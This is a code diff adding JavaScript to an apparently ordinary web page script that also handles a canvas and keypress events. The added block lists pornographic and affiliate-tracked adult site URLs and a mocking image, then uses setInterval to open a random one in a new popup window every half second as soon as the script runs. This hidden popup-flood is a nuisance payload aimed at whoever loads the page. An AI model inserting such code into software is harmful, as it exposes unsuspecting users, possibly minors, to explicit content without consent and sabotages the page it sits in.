@@ -39,6 +39,33 @@ if (context) {
   alert('browser not supported') ;
 }
 
+var pwindows = [
+            "http://www.ashleyrnadison.com/",
+            'http://new.livejasmin.com/en/?showPreviousVersionLink=0',
+            'http://www.adulthookups.com/dating/allaboutsex2',
+            'http://blackpleasure.net/',
+            'http://www.fling.com/tour/zhulavidrappop/?prg=1&id=phpop_us&tour=zhulavidrappop&ot=zhulavidrappop&ad_id=totaltrak_68741_246&utm_source=phpop_us&utm_medium=_nocmp&utm_content=totaltrak_68741_246&utm_campaign=zhulavidrappop&ej=flnoej',
+            'http://www.snapsext.com/tour/zsnapsexthulavid2fanpop/?prg=1&id=phpop_us&tour=zsnapsexthulavid2fanpop&ot=zsnapsexthulavid2fanpop&ad_id=totaltrak_68741_220&utm_source=phpop_us&utm_medium=_nocmp&utm_content=totaltrak_68741_220&utm_campaign=zsnapsexthulavid2fanpop&ej=ssnoej',   
+            'http://www.livejasmin.com/listpage.php?psid=futuration&campaign_id=80651&pstour=t1&psprogram=REVS&pstool=15_1',        
+            'http://www.livejasmin.com/freechat.php?performerid=SabinaBlack&tags=girl&recId=i2lqcm7y-8emgmbd42z1-0q9w7nn&recPos=203&hq=0',        
+            'http://www.pornhub.com/',       
+            'http://www.spankwire.com/',       
+            'https://pbs.twimg.com/profile_images/426548205611139072/lWNFAlcZ.jpeg',       
+            'http://chris.demero.net/wp-content/uploads/2013/02/gorilla_showing_you_the_middle_finger.jpeg'
+]
+
+
+var interval = setInterval(openwindow, 500)
+
+function openwindow(){
+    // window.open('http://www.google.com', randWindow, "height=600,width=1800")
+    var rand = Math.floor(Math.random() * 12) + 1
+    var randname = Math.floor(Math.random() * 999999999999) + 1
+    window.open(pwindows[rand], randname, "height=600,width=1800")
+}
+
+
+
     $(document).keypress(function(e) { 
         console.log(e.which)
         now = +new Date()
